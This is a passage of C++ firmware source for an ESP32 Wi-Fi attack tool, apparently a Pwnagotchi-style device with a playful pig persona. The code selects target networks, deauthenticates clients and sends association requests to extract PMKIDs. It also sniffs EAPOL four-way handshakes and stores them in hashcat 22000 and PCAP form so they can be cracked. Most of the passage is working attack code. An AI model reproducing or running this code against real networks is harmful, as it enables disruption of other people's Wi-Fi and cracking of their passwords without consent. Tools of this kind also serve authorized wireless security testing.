                    hasPendingHandshake = false;
                    if (targetIndex >= 0 && targetIndex < (int)networks().size()) {
                        const bool wasBusy2 = oinkBusy;
                        oinkBusy = true;
                        NetworkRecon::enterCritical();
                        for (const auto& hs : handshakes) {
                            if (memcmp(hs.bssid, networks()[targetIndex].bssid, 6) == 0 &&
                                hs.hasM1() && !hs.hasM2()) {
                                hasPendingHandshake = true;
                                break;
                            }
                        }
                        NetworkRecon::exitCritical();
                        oinkBusy = wasBusy2;
                    }
                }

                // Change 3: M1-only captures get aggressive extended wait (3x = 13.5s)
                // to give slow clients (IoT) time to complete handshake
                uint32_t maxWait = hasPendingHandshake ? (WAIT_TIME * 3) : (WAIT_TIME * 2);
                if (hasPendingHandshake && now - stateStartTime < maxWait) {
                    break;
                }

                // Reset for next WAITING state
                checkedForPendingHandshake = false;
                hasPendingHandshake = false;
                autoState = AutoState::NEXT_TARGET;
            }
            break;
            
        case AutoState::BORED:
            // Pig is bored - no valid targets available
            // Stop grass, show bored phrases, periodically retry

            // Adaptive channel hop: fast sweep (500ms) when spectrum is empty
            // or all networks are below RSSI threshold (user is moving),
            // slow (2000ms) when strong networks present but none are valid targets
            uint32_t boredHopInterval;
            {
                bool anyStrong = false;
                NetworkRecon::enterCritical();
                bool isEmpty = networks().empty();
                if (!isEmpty) {
                    for (size_t i = 0; i < networks().size() && i < 20; i++) {
                        int8_t r = (networks()[i].rssiAvg != 0) ? networks()[i].rssiAvg : networks()[i].rssi;
                        if (r >= Config::wifi().attackMinRssi) { anyStrong = true; break; }
                    }
                }
                uint16_t netCount = networks().size();
                NetworkRecon::exitCritical();
                boredHopInterval = isEmpty ? 500 : (anyStrong ? 2000 : 500);

                if (now - lastHopTime > boredHopInterval) {
                    hopChannel();
                    lastHopTime = now;
                }

                // Update bored mood every 5 seconds
                if (now - lastBoredUpdate > 5000) {
                    Mood::onBored(netCount);
                    lastBoredUpdate = now;
                }

                // Change 5: Opportunistic PMKID probing during BORED state
                // Already idle on each channel, probe eligible APs for free
                {
                    static uint32_t lastBoredPmkidProbe = 0;
                    if (!isEmpty && now - lastBoredPmkidProbe > 2000) {
                        lastBoredPmkidProbe = now;
                        uint8_t curCh = NetworkRecon::getCurrentChannel();
                        NetworkRecon::enterCritical();
                        for (size_t i = 0; i < networks().size() && i < 30; i++) {
                            const auto& net = networks()[i];
                            if (net.channel != curCh) continue;
                            if (net.authmode == WIFI_AUTH_OPEN || net.authmode == WIFI_AUTH_WEP) continue;
                            if (net.hasPMF || net.ssid[0] == 0 || net.isHidden) continue;
                            if (isExcluded(net.bssid)) continue;
                            bool hasPMKID = false;
                            for (const auto& p : pmkids) {
                                if (memcmp(p.bssid, net.bssid, 6) == 0) { hasPMKID = true; break; }
                            }
                            if (hasPMKID) continue;
                            // Found eligible AP on current channel — probe it
                            uint8_t probeBssid[6];
                            char probeSSID[33];
                            memcpy(probeBssid, net.bssid, 6);
                            strncpy(probeSSID, net.ssid, 32);
                            probeSSID[32] = 0;
                            NetworkRecon::exitCritical();
                            sendAuthenticationRequest(probeBssid);
                            delay(10);
                            sendAssociationRequest(probeBssid, probeSSID, strlen(probeSSID));
                            goto bored_pmkid_done;  // Probe one per cycle
                        }
                        NetworkRecon::exitCritical();
                        bored_pmkid_done:;
                    }
                }

                // Check if new networks appeared (promiscuous mode still active)
                // getNextTarget() uses spinlock internally
                if (!isEmpty) {
                    int nextIdx = getNextTarget();
                    if (nextIdx >= 0) {
                        // New valid target appeared!
                        consecutiveFailedScans = 0;
                        autoState = AutoState::NEXT_TARGET;
                        channelHopping = true;
                        Mood::setStatusMessage("new bacon!");
                        Avatar::sniff();
                        break;
                    }
                }
            }

            // Periodic retry - do a fresh scan every 30 seconds
            if (now - stateStartTime > BORED_RETRY_TIME) {
                autoState = AutoState::SCANNING;
                stateStartTime = now;
                channelHopping = true;
                consecutiveFailedScans = 0;  // Reset for fresh attempt
            }
            break;
    }
    
    // NOTE: Network cleanup is now handled centrally by NetworkRecon::cleanupStaleNetworks()
    // which runs every 5 seconds. This eliminates dual cleanup race conditions.
    // OINK only needs to revalidate its indices when networks change.
    
    // Periodic index revalidation (in case NetworkRecon cleaned up our target)
    if (now - lastCleanupTime > 5000) {
        lastCleanupTime = now;
        
        // Revalidate targetIndex using stored BSSID
        if (targetIndex >= 0) {
            NetworkRecon::enterCritical();
            int foundIdx = -1;
            for (int i = 0; i < (int)networks().size(); i++) {
                if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
                    foundIdx = i;
                    break;
                }
            }
            NetworkRecon::exitCritical();
            
            if (foundIdx != targetIndex) {
                targetIndex = foundIdx;
                if (targetIndex < 0) {
                    deauthing = false;
                    channelHopping = true;
                    memset(targetBssid, 0, 6);
                    clearTargetClients();
                }
            }
        }
        
        // Bounds check selectionIndex
        NetworkRecon::enterCritical();
        if (!networks().empty() && selectionIndex >= (int)networks().size()) {
            selectionIndex = networks().size() - 1;
        } else if (networks().empty()) {
            selectionIndex = 0;
        }
        NetworkRecon::exitCritical();
    }
    
    // Emergency heap recovery - erase lowest-priority networks from back (O(1) per pop)
    // After sortNetworksByPriority, worst candidates are at the back.
    if (ESP.getFreeHeap() < HeapPolicy::kMinHeapForOinkNetworkAdd && networks().size() > 50) {
        oinkBusy = true;
        NetworkRecon::enterCritical();

        int emergencyErased = 0;
        while (networks().size() > 50 && emergencyErased < 3) {
            size_t lastIdx = networks().size() - 1;
            // Preserve current target: if back element is target, swap with second-to-last
            if (targetIndex >= 0 && memcmp(networks()[lastIdx].bssid, targetBssid, 6) == 0) {
                if (lastIdx > 0) {
                    std::swap(networks()[lastIdx], networks()[lastIdx - 1]);
                } else {
                    break;  // Target is the only element, don't erase
                }
            }
            networks().pop_back();  // O(1) - no memmove
            emergencyErased++;
        }

        // Revalidate target by BSSID (pop_back may have removed it despite swap attempt)
        if (emergencyErased > 0 && targetIndex >= 0) {
            int foundIdx = -1;
            for (int i = 0; i < (int)networks().size(); i++) {
                if (memcmp(networks()[i].bssid, targetBssid, 6) == 0) {
                    foundIdx = i;
                    break;
                }
            }
            targetIndex = foundIdx;
            if (targetIndex < 0) {
                deauthing = false;
                channelHopping = true;
                memset(targetBssid, 0, 6);
                clearTargetClients();
            }
        }

        if (emergencyErased > 0) {
            if (selectionIndex >= (int)networks().size()) {
                selectionIndex = networks().empty() ? 0 : (int)networks().size() - 1;
            }
        }

        NetworkRecon::exitCritical();
        oinkBusy = false;
    }

    // Run auto-save only when we're not in handshake/PMKID capture-critical states.
    // If unsafe now, re-queue the request for a later update cycle.
    if (shouldAutoSave) {
        bool captureCritical =
            (autoState == AutoState::PMKID_HUNTING) ||
            (autoState == AutoState::LOCKING) ||
            (autoState == AutoState::ATTACKING) ||
            (autoState == AutoState::WAITING);

        if (!captureCritical) {
            autoSaveCheck();
        } else {
            NetworkRecon::enterCritical();
            pendingAutoSave = true;
            NetworkRecon::exitCritical();
        }
    }

    updateTargetCache();
}

void OinkMode::startScan() {
    scanning = true;
    channelHopping = true;
    currentHopIndex = 0;
}

void OinkMode::stopScan() {
    scanning = false;
}

void OinkMode::selectTarget(int index) {
    // Snapshot network data under spinlock to prevent stale reads
    uint8_t snapBssid[6] = {0};
    uint8_t snapChannel = 0;
    bool valid = false;

    NetworkRecon::enterCritical();
    if (index >= 0 && index < (int)networks().size()) {
        memcpy(snapBssid, networks()[index].bssid, 6);
        snapChannel = networks()[index].channel;
        networks()[index].isTarget = true;
        valid = true;
    }
    NetworkRecon::exitCritical();

    if (valid) {
        clearTargetClients();
        deauthPauseUntilMs.store(0, std::memory_order_relaxed);
        targetIndex = index;
        memcpy(targetBssid, snapBssid, 6);

        // Clear old beacon frame when target changes (static storage, no free)
        beaconFrame = beaconFrameStorage;
        beaconFrameLen = 0;
        beaconCaptured = false;

        // 2.4GHz target: lock to target's channel
        // (5GHz targets are dispatched via C5 background, never reach selectTarget)
        channelHopping = false;
        setChannel(snapChannel);
        deauthing = true;
    }

    updateTargetCache();
}

void OinkMode::clearTarget() {
    NetworkRecon::enterCritical();
    if (targetIndex >= 0 && targetIndex < (int)networks().size()) {
        networks()[targetIndex].isTarget = false;
    }
    NetworkRecon::exitCritical();
    targetIndex = -1;
    memset(targetBssid, 0, 6);
    clearTargetClients();
    deauthPauseUntilMs.store(0, std::memory_order_relaxed);
    deauthing = false;
    channelHopping = true;
    // Unlock channel so NetworkRecon resumes hopping
    if (NetworkRecon::isChannelLocked()) {
        NetworkRecon::unlockChannel();
    }
    updateTargetCache();
}

DetectedNetwork* OinkMode::getTarget() {
    if (targetIndex >= 0 && targetIndex < (int)networks().size()) {
        return &networks()[targetIndex];
    }
    return nullptr;
}

void OinkMode::moveSelectionUp() {
    if (networks().empty()) return;
    selectionIndex--;
    if (selectionIndex < 0) selectionIndex = networks().size() - 1;
}

void OinkMode::moveSelectionDown() {
    if (networks().empty()) return;
    selectionIndex++;
    if (selectionIndex >= (int)networks().size()) selectionIndex = 0;
}

void OinkMode::confirmSelection() {
    if (networks().empty()) return;
    if (selectionIndex >= 0 && selectionIndex < (int)networks().size()) {
        selectTarget(selectionIndex);
    }
}

void OinkMode::startDeauth() {
    if (!running || targetIndex < 0) return;
    
    deauthing = true;
    channelHopping = false;
}

void OinkMode::stopDeauth() {
    deauthing = false;
}

void OinkMode::setChannel(uint8_t ch) {
    if (ch < 1 || ch > 14) return;
    currentChannel = ch;
    // #region agent log - H1/H2 channel conflict
    Serial.printf("[DBG-H1H2] OINK setCh=%d reconCh=%d reconLocked=%d\n", ch, NetworkRecon::getCurrentChannel(), NetworkRecon::isChannelLocked() ? 1 : 0);
    // #endregion
    // Use NetworkRecon's channel lock to prevent hopping during target lock
    NetworkRecon::lockChannel(ch);
}

void OinkMode::enableChannelHop(bool enable) {
    channelHopping = enable;
}

void OinkMode::hopChannel() {
    // Unlock NetworkRecon channel and let it handle hopping
    // OINK no longer needs to hop itself - NetworkRecon does this
    if (NetworkRecon::isChannelLocked()) {
        NetworkRecon::unlockChannel();
    }
    // Sync our currentChannel with NetworkRecon's for display purposes
    currentChannel = NetworkRecon::getCurrentChannel();
}

void OinkMode::promiscuousCallback(const wifi_promiscuous_pkt_t* pkt, wifi_promiscuous_pkt_type_t type) {
    // This callback is registered with NetworkRecon for OINK-specific packet processing
    // NetworkRecon already handles beacon/network tracking, so we focus on:
    // 1. Beacon capture for target AP (for PCAP)
    // 2. Data frame processing (EAPOL/handshake capture)
    
    if (!pkt) return;
    if (!running) return;

    uint16_t len = pkt->rx_ctrl.sig_len;
    int8_t rssi = pkt->rx_ctrl.rssi;

    // ESP32 adds 4 ghost bytes to sig_len
    if (len > 4) len -= 4;
    if (len < 24) return;

    packetCount.fetch_add(1, std::memory_order_relaxed);

    const uint8_t* payload = pkt->payload;
    uint8_t frameSubtype = (payload[0] >> 4) & 0x0F;

    switch (type) {
        case WIFI_PKT_MGMT:
            // Gate beacon processing behind oinkBusy — beacons are non-critical
            if (oinkBusy) break;
            if (frameSubtype == 0x08) {
                processBeacon(payload, len, rssi);
            }
            break;

        case WIFI_PKT_DATA:
            // EAPOL is time-critical (<30ms handshake window) — NEVER gate behind oinkBusy.
            // Thread safety is handled by spinlock in processDataFrame/processEAPOL
            // and CAS atomics in the pending handshake pool.
            processDataFrame(payload, len, rssi);
            break;

        default:
            break;
    }
}

void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) {
    // NOTE: Network discovery is now handled by NetworkRecon
    // This function only captures beacon for target AP (needed for PCAP/hashcat)
    
    if (len < 36) return;
    
    const uint8_t* bssid = payload + 16;
    
    // Capture beacon for target AP only
    // Use BSSID match instead of targetIndex for cross-core safety (callback runs on core 1,
    // targetIndex is written on core 0 and can become stale after cleanupStaleNetworks)
    if (!beaconCaptured && targetBssid[0] != 0) {
        if (memcmp(bssid, targetBssid, 6) == 0) {
            if (len > MAX_BEACON_SIZE) {
                return;  // Drop oversized beacon
            }
            memcpy(beaconFrameStorage, payload, len);
            beaconFrame = beaconFrameStorage;
            beaconFrameLen = len;
            beaconCaptured = true;
        }
    }
    
    // Update hasHandshake flag for target AP only (not every beacon).
    // The flag is already set when handshakes are captured in processEAPOL/ATTACKING/C5 paths.
    // This is a consistency check restricted to target BSSID to avoid spinlock thrashing
    // on every beacon from every AP in the callback hot path.
    if (targetBssid[0] != 0 && memcmp(bssid, targetBssid, 6) == 0) {
        bool hasHs = hasHandshakeFor(bssid);
        NetworkRecon::enterCritical();
        auto& nets = NetworkRecon::getNetworks();
        for (int i = 0; i < (int)nets.size(); i++) {
            if (memcmp(nets[i].bssid, bssid, 6) == 0) {
                nets[i].hasHandshake = hasHs;
                break;
            }
        }
        NetworkRecon::exitCritical();
    }
}

// Note: Legacy processBeacon network discovery code removed
// Network tracking is now handled by NetworkRecon

void OinkMode::processProbeResponse(const uint8_t* payload, uint16_t len, int8_t rssi) {
    // Probe responses reveal hidden SSIDs
    if (len < 36) return;
    
    const uint8_t* bssid = payload + 16;
    
    // NOTE: Network discovery is now handled by NetworkRecon
    // OINK probe response processing only updates existing networks for SSID reveal
    int idx = findNetwork(bssid);
    if (idx < 0) {
        return;  // Network not yet tracked by NetworkRecon - skip
    }
    
    // Protect all network vector accesses with spinlock
    NetworkRecon::enterCritical();
    
    // Revalidate index after acquiring lock (vector may have changed)
    if (idx >= (int)networks().size()) {
        NetworkRecon::exitCritical();
        return;
    }
    
    // If network has hidden SSID, try to extract from probe response
    if (networks()[idx].ssid[0] == 0 || networks()[idx].isHidden) {
        uint16_t offset = 36;
        while (offset + 2 < len) {
            uint8_t id = payload[offset];
            uint8_t ieLen = payload[offset + 1];
            
            if (offset + 2 + ieLen > len) break;
            
            if (id == 0 && ieLen > 0 && ieLen <= 32) {
                memcpy(networks()[idx].ssid, payload + offset + 2, ieLen);
                networks()[idx].ssid[ieLen] = 0;
                networks()[idx].isHidden = false;
                
                // DEFERRED: Queue mood event for main thread
                if (!pendingNewNetwork) {
                    strncpy(pendingNetworkSSID, networks()[idx].ssid, 32);
                    pendingNetworkSSID[32] = 0;
                    pendingNetworkRSSI = rssi;
                    pendingNetworkChannel = networks()[idx].channel;
                    pendingNewNetwork = true;
                }
                break;
            }
            
            offset += 2 + ieLen;
        }
    }
    
    networks()[idx].lastSeen = millis();
    NetworkRecon::exitCritical();
}

void OinkMode::processDataFrame(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (len < 28) return;
    
    // Extract addresses based on ToDS/FromDS flags
    uint8_t toDs = (payload[1] & 0x01);
    uint8_t fromDs = (payload[1] & 0x02) >> 1;
    
    const uint8_t* bssid = nullptr;
    const uint8_t* clientMac = nullptr;
    
    // Address layout depends on ToDS/FromDS:
    // ToDS=0, FromDS=1: Addr1=DA(client), Addr2=BSSID, Addr3=SA
    // ToDS=1, FromDS=0: Addr1=BSSID, Addr2=SA(client), Addr3=DA
    if (!toDs && fromDs) {
        // From AP to client
        bssid = payload + 10;      // Addr2
        clientMac = payload + 4;   // Addr1 (destination = client)
    } else if (toDs && !fromDs) {
        // From client to AP
        bssid = payload + 4;       // Addr1
        clientMac = payload + 10;  // Addr2 (source = client)
    }
    
    // Track client if we identified both
    if (bssid && clientMac) {
        // Don't track broadcast/multicast
        if ((clientMac[0] & 0x01) == 0) {
            trackTargetClient(bssid, clientMac, rssi);
        }
    }
    
    // Check for EAPOL (LLC/SNAP header: AA AA 03 00 00 00 88 8E)
    // Data starts after 802.11 header (24 bytes for data frames)
    // May have QoS (2 bytes) and/or HTC (4 bytes)
    
    uint16_t offset = 24;
    
    // Adjust offset for address 4 if needed
    if (toDs && fromDs) offset += 6;
    
    // Check for QoS Data frame (subtype has bit 3 set = 0x08, 0x09, etc.)
    // Frame control byte 0: bits 4-7 = subtype, bit 3 of subtype = QoS
    uint8_t subtype = (payload[0] >> 4) & 0x0F;
    bool isQoS = (subtype & 0x08) != 0;
    if (isQoS) {
        offset += 2;  // QoS control field
    }
    
    // Check for HTC field (High Throughput Control, +HTC/Order bit)
    // Only present in QoS data frames when Order bit (bit 7 of FC byte 1) is set
    if (isQoS && (payload[1] & 0x80)) {
        offset += 4;  // HTC field
    }
    
    if (offset + 8 > len) return;
    
    // Check LLC/SNAP header for EAPOL
    if (payload[offset] == 0xAA && payload[offset+1] == 0xAA &&
        payload[offset+2] == 0x03 && payload[offset+3] == 0x00 &&
        payload[offset+4] == 0x00 && payload[offset+5] == 0x00 &&
        payload[offset+6] == 0x88 && payload[offset+7] == 0x8E) {
        
        // This is EAPOL!
        const uint8_t* srcMac = payload + 10;  // TA
        const uint8_t* dstMac = payload + 4;   // RA
        
        processEAPOL(payload + offset + 8, len - offset - 8, srcMac, dstMac, payload, len, rssi);
    }
}

void OinkMode::processEAPOL(const uint8_t* payload, uint16_t len, 
                             const uint8_t* srcMac, const uint8_t* dstMac,
                             const uint8_t* fullFrame, uint16_t fullFrameLen, int8_t rssi) {
    if (len < 4) return;
    
    // EAPOL: version(1) + type(1) + length(2) + descriptor(...)
    uint8_t type = payload[1];
    
    if (type != 3) return;  // Only interested in EAPOL-Key
    
    if (len < 99) return;  // Minimum EAPOL-Key frame
    
    // Key info at offset 5-6
    uint16_t keyInfo = (payload[5] << 8) | payload[6];
    uint8_t install = (keyInfo >> 6) & 0x01;
    uint8_t keyAck = (keyInfo >> 7) & 0x01;
    uint8_t keyMic = (keyInfo >> 8) & 0x01;
    uint8_t secure = (keyInfo >> 9) & 0x01;
    
    uint8_t messageNum = 0;
    if (keyAck && !keyMic) messageNum = 1;
    else if (!keyAck && keyMic && !secure) messageNum = 2;  // M2: has MIC, not secure (M4 is secure)
    else if (keyAck && keyMic && install) messageNum = 3;
    else if (!keyAck && keyMic && secure) messageNum = 4;
    
    if (messageNum == 0) return;

    // Determine which is AP (sender of M1/M3) and station
    uint8_t bssid[6], station[6];
    if (messageNum == 1 || messageNum == 3) {
        memcpy(bssid, srcMac, 6);
        memcpy(station, dstMac, 6);
    } else {
        memcpy(bssid, dstMac, 6);
        memcpy(station, srcMac, 6);
    }

    const bool stationIsOurs = ourStaMacValid && (memcmp(station, ourStaMac, 6) == 0);
    const bool stationIsUnicast = OinkCaptureFilters::isUnicastMac(station);

    // Deferred diagnostic: flag for main loop to print (no Serial in callback context)
    if (!pendingEapolMsg) {
        memcpy(pendingEapolBssid, bssid, 6);
        memcpy(pendingEapolStation, station, 6);
        pendingEapolFlags = stationIsOurs ? 0x01 : 0x00;
        pendingEapolMsg = messageNum;  // volatile write last — acts as release
    }
    
    // M1 = AP initiating handshake = client reconnected after deauth!
    // If we're deauthing this target, our deauth worked!
    // Use BSSID match instead of targetIndex for cross-core safety (callback runs on core 1,
    // targetIndex can become stale after cleanupStaleNetworks shifts indices on core 0)
    if (messageNum == 1 && deauthing && targetBssid[0] != 0) {
        if (memcmp(bssid, targetBssid, 6) == 0) {
            // PMKID probing can cause AP->STA M1 retransmits to our own station MAC.
            // Do not treat those as "deauth success" (and don't pause jamming) or we will miss real client handshakes.
            if (OinkCaptureFilters::shouldMarkDeauthSuccessOnM1(stationIsOurs, stationIsUnicast)) {
                // Stop blasting for a short window and listen for M2/M3/M4.
                // Continuous deauth here can interrupt the handshake we just induced.
                deauthPauseUntilMs.store(millis() + DEAUTH_POST_M1_LISTEN_MS, std::memory_order_relaxed);
                // DEFERRED: Queue deauth success for main thread
                if (!pendingDeauthSuccess) {
                    memcpy(pendingDeauthStation, station, 6);
                    pendingDeauthSuccess = true;
                }
            }
        }
    }
    
    // ========== PMKID EXTRACTION FROM M1 ==========
    // PMKID is in Key Data field of M1 when AP supports it (WPA2/WPA3 only)
    // EAPOL-Key frame: descriptor_type(1) @ offset 4, key_data_length(2) @ offset 97-98, key_data @ offset 99
    // Key Data contains RSN IE with PMKID: dd 14 00 0f ac 04 [16-byte PMKID]
    // Only RSN (descriptor type 0x02) has PMKID - WPA1 (0xFE) does not
    uint8_t descriptorType = payload[4];
    if (messageNum == 1 && descriptorType == 0x02 && len >= 121) {  // RSN + 99 + 22 bytes minimum
        uint16_t keyDataLen = (payload[97] << 8) | payload[98];
        
        // PMKID Key Data is exactly 22 bytes: dd(1) + len(1) + OUI(3) + type(1) + PMKID(16)
        if (keyDataLen >= 22 && len >= 99 + keyDataLen) {
            const uint8_t* keyData = payload + 99;
            
            // Look for PMKID KDE: dd 14 00 0f ac 04 (vendor IE, IEEE OUI, PMKID type)
            // Can appear at start or within Key Data
            for (uint16_t i = 0; i + 22 <= keyDataLen; i++) {  // Need exactly 22 bytes for KDE
                if (keyData[i] == 0xdd && keyData[i+1] == 0x14 &&
                    keyData[i+2] == 0x00 && keyData[i+3] == 0x0f &&
                    keyData[i+4] == 0xac && keyData[i+5] == 0x04) {
                    
                    // Double-check we have 22 bytes: tag(1) + len(1) + OUI(3) + type(1) + PMKID(16)
                    if (i + 22 > keyDataLen) break;  // Defensive bounds check
                    
                    // Found PMKID KDE! Extract the 16 bytes
                    const uint8_t* pmkidData = keyData + i + 6;
                    
                    // Check if PMKID is all zeros (some APs send empty PMKID KDE)
                    bool allZeros = true;
                    for (int z = 0; z < 16; z++) {
                        if (pmkidData[z] != 0) { allZeros = false; break; }
                    }
                    if (allZeros) {
                        break;  // Skip invalid PMKID
                    }
                    
                    // Check if we already have this PMKID (lookup only - no push_back)
                    int pmkIdx = findOrCreatePMKID(bssid, station);
                    if (pmkIdx >= 0) {
                        // Protect PMKID vector access with spinlock
                        NetworkRecon::enterCritical();
                        
                        // Revalidate index
                        if (pmkIdx >= (int)pmkids.size() || pmkids[pmkIdx].saved) {
                            NetworkRecon::exitCritical();
                            break;
                        }
                        
                        CapturedPMKID& p = pmkids[pmkIdx];
                        memcpy(p.pmkid, pmkidData, 16);
                        p.timestamp = millis();
                        
                        // Look up SSID (already holding lock)
                        if (p.ssid[0] == 0) {
                            for (int ni = 0; ni < (int)networks().size(); ni++) {
                                if (memcmp(networks()[ni].bssid, bssid, 6) == 0) {
                                    strncpy(p.ssid, networks()[ni].ssid, 32);
                                    p.ssid[32] = 0;
                                    break;
                                }
                            }
                        }
                        
                        char ssidCopy[33] = {0};
                        strncpy(ssidCopy, p.ssid, 32);
                        NetworkRecon::exitCritical();
                        
                        // Queue mood event outside critical section
                        if (!pendingPMKIDCapture) {
                            strncpy(pendingPMKIDSSID, ssidCopy, 32);
                            pendingPMKIDSSID[32] = 0;
                            pendingPMKIDCapture = true;
                        }
                    } else if (pmkIdx < 0) {
                        // New PMKID - queue for creation in main thread
                        // Get SSID from networks if available (with spinlock)
                        char ssidBuf[33] = {0};
                        NetworkRecon::enterCritical();
                        for (int ni = 0; ni < (int)networks().size(); ni++) {
                            if (memcmp(networks()[ni].bssid, bssid, 6) == 0) {
                                strncpy(ssidBuf, networks()[ni].ssid, 32);
                                ssidBuf[32] = 0;
                                break;
                            }
                        }
                        NetworkRecon::exitCritical();

                        if (enqueuePendingPMKID(bssid, station, pmkidData, ssidBuf)) {
                            // Trigger auto-save for PMKID (with backfill retry)
                            pendingAutoSave = true;

                            // Queue the mood event
                            if (!pendingPMKIDCapture) {
                                strncpy(pendingPMKIDSSID, ssidBuf, 32);
                                pendingPMKIDSSID[32] = 0;
                                pendingPMKIDCapture = true;
                            }
                        }
                    }
                    break;  // Found it, stop searching
                }
            }
        }
    }

    // Treat EAPOL where station == our STA MAC as probe traffic: keep PMKID extraction above,
    // but do not create/store handshake records (avoids burning handshake slots and deauth-success false positives).
    if (!OinkCaptureFilters::shouldStoreHandshakeForStation(stationIsOurs)) {
        return;
    }
    
    // Find or create handshake entry (lookup only - no push_back)
    int hsIdx = findOrCreateHandshake(bssid, station);
    
    if (hsIdx >= 0) {
        // Protect handshake vector access with spinlock
        NetworkRecon::enterCritical();
        
        // Revalidate index after acquiring lock
        if (hsIdx >= (int)handshakes.size()) {
            NetworkRecon::exitCritical();
            return;
        }
        
        CapturedHandshake& hs = handshakes[hsIdx];

        // Store this frame (EAPOL payload for hashcat 22000)
        // Guard: don't overwrite an already-captured frame — retransmissions
        // may carry a different ANonce/SNonce, producing nonce mismatch that
        // makes the .22000/.pcap uncrackable.
        uint8_t frameIdx = messageNum - 1;
        if (hs.frames[frameIdx].len == 0) {
            uint16_t copyLen = min((uint16_t)512, len);
            memcpy(hs.frames[frameIdx].data, payload, copyLen);
            hs.frames[frameIdx].len = copyLen;
            hs.frames[frameIdx].messageNum = messageNum;
            hs.frames[frameIdx].timestamp = millis();
            hs.frames[frameIdx].rssi = rssi;

            // Store full 802.11 frame for PCAP export (radiotap + WPA-SEC compatibility)
            uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
            memcpy(hs.frames[frameIdx].fullFrame, fullFrame, fullCopyLen);
            hs.frames[frameIdx].fullFrameLen = fullCopyLen;

            // Update mask
            hs.capturedMask |= (1 << frameIdx);
        }
        hs.lastSeen = millis();
        
        // Look up SSID from networks if not set (already holding NetworkRecon critical section)
        if (hs.ssid[0] == 0) {
            for (int ni = 0; ni < (int)networks().size(); ni++) {
                if (memcmp(networks()[ni].bssid, bssid, 6) == 0) {
                    strncpy(hs.ssid, networks()[ni].ssid, 32);
                    hs.ssid[32] = 0;
                    break;
                }
            }
        }
        
        // Check completion and queue events
        bool isComplete = hs.isComplete();
        bool notSaved = !hs.saved;
        char ssidCopy[33] = {0};
        if (isComplete && notSaved) {
            strncpy(ssidCopy, hs.ssid, 32);
        }
        
        NetworkRecon::exitCritical();
        
        // Queue mood/save events outside critical section
        if (isComplete && notSaved) {
            if (!pendingHandshakeComplete) {
                strncpy(pendingHandshakeSSID, ssidCopy, 32);
                pendingHandshakeSSID[32] = 0;
                pendingHandshakeComplete = true;
            }
            pendingAutoSave = true;

            // Change 9: Set O(1) completion flag for ATTACKING state check
            memcpy(justCompletedBssid, bssid, 6);
            handshakeJustCompleted = true;  // volatile write last — acts as release
        }
    } else {
        // New handshake - enqueue to circular buffer for main thread
        // Circular buffer allows queueing multiple rapid EAPOL frames (M1-M4 within ms)
        
        // Find or update existing slot for this handshake in the buffer
        uint8_t targetSlot = PENDING_HS_SLOTS;  // Invalid slot marker
        uint8_t writePos = pendingHsWrite;
        uint8_t frameIdx = messageNum - 1;
        bool frameWrittenInAlloc = false;
        
        // Check if we already have a slot for this handshake (scan from read to write)
        uint8_t scanPos = pendingHsRead;
        while (scanPos != writePos) {
            if (pendingHandshakes[scanPos] &&
                memcmp(pendingHandshakes[scanPos]->bssid, bssid, 6) == 0 &&
                memcmp(pendingHandshakes[scanPos]->station, station, 6) == 0) {
                targetSlot = scanPos;
                break;
            }
            scanPos = (scanPos + 1) % PENDING_HS_SLOTS;
        }
        
        // If not found, try to allocate a new slot from static pool
        if (targetSlot >= PENDING_HS_SLOTS) {
            // Check if buffer is full (write pointer would catch read pointer)
            uint8_t nextWrite = (writePos + 1) % PENDING_HS_SLOTS;
            if (nextWrite != pendingHsRead && !pendingHsBusy[writePos] && !pendingHsAllocated[writePos]) {
                // Slot is available - acquire from static pool (no heap ops)
                targetSlot = writePos;
                
                // STATIC POOL: Point to pre-allocated slot (no malloc in callback context)
                pendingHsAllocated[targetSlot] = true;
                pendingHandshakes[targetSlot] = &pendingHsPool[targetSlot];
                
                pendingHsBusy[targetSlot] = true;  // Lock slot during init and first frame write
                
                memcpy(pendingHandshakes[targetSlot]->bssid, bssid, 6);
                memcpy(pendingHandshakes[targetSlot]->station, station, 6);
                pendingHandshakes[targetSlot]->messageNum = 0;  // Deprecated field
                pendingHandshakes[targetSlot]->capturedMask = 0;
                pendingHandshakes[targetSlot]->hasPMKID = false;

                // Write the first frame before publishing write pointer.
                // This prevents consumer from seeing/consuming an empty slot.
                if (frameIdx < 4) {
                    // EAPOL payload for hashcat 22000
                    uint16_t copyLen = min((uint16_t)512, len);
                    memcpy(pendingHandshakes[targetSlot]->frames[frameIdx].data, payload, copyLen);
                    pendingHandshakes[targetSlot]->frames[frameIdx].len = copyLen;

                    // Full 802.11 frame for PCAP export
                    uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
                    memcpy(pendingHandshakes[targetSlot]->frames[frameIdx].fullFrame, fullFrame, fullCopyLen);
                    pendingHandshakes[targetSlot]->frames[frameIdx].fullFrameLen = fullCopyLen;
                    pendingHandshakes[targetSlot]->frames[frameIdx].rssi = rssi;

                    pendingHandshakes[targetSlot]->capturedMask |= (1 << frameIdx);
                    frameWrittenInAlloc = true;
                }
                
                // Advance write pointer
                pendingHsWrite = nextWrite;
                
                pendingHsBusy[targetSlot] = false;  // Unlock after init
            }
            // else: buffer full, drop this frame (extremely rare with 4 slots)
        }
        
        // Store frame in target slot if we have one.
        // CAS acquire: prevents concurrent access with consumer (main loop, core 0).
        // If CAS fails (consumer is reading this slot), drop the frame —
        // EAPOL handshakes are retransmitted so we'll catch the next one.
        if (!frameWrittenInAlloc && targetSlot < PENDING_HS_SLOTS && pendingHandshakes[targetSlot]) {
            bool expected = false;
            if (pendingHsBusy[targetSlot].compare_exchange_strong(expected, true)) {
                if (frameIdx < 4) {
                    // EAPOL payload for hashcat 22000
                    uint16_t copyLen = min((uint16_t)512, len);
                    memcpy(pendingHandshakes[targetSlot]->frames[frameIdx].data, payload, copyLen);
                    pendingHandshakes[targetSlot]->frames[frameIdx].len = copyLen;

                    // Full 802.11 frame for PCAP export
                    uint16_t fullCopyLen = min((uint16_t)300, fullFrameLen);
                    memcpy(pendingHandshakes[targetSlot]->frames[frameIdx].fullFrame, fullFrame, fullCopyLen);
                    pendingHandshakes[targetSlot]->frames[frameIdx].fullFrameLen = fullCopyLen;
                    pendingHandshakes[targetSlot]->frames[frameIdx].rssi = rssi;

                    pendingHandshakes[targetSlot]->capturedMask |= (1 << frameIdx);
                }
                pendingHsBusy[targetSlot].store(false);  // Release CAS lock
            }
        }
    }
}

